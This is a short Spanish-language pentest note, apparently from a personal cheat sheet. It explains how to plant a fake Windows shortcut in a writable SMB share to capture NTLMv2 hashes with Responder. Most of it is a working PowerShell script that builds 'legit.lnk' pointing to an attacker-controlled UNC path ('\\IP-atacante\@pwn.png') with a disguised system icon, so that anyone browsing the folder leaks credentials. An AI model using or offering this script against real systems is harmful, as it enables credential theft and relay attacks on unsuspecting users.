### Info

Si podemos subir un archivo a una carpeta smb, podemos crear un falso lnk que nos permita aprovechar a responder para envenenar el tráfico ntlmv2 

### Creacion del archivo

    $objShell = New-Object -ComObject WScript.Shell
    $lnk = $objShell.CreateShortcut("legit.lnk")
    $lnk.TargetPath = "\\IP-atacante\@pwn.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth 
    request."
    $lnk.HotKey = "Ctrl+Alt+O"
    $lnk.Save()


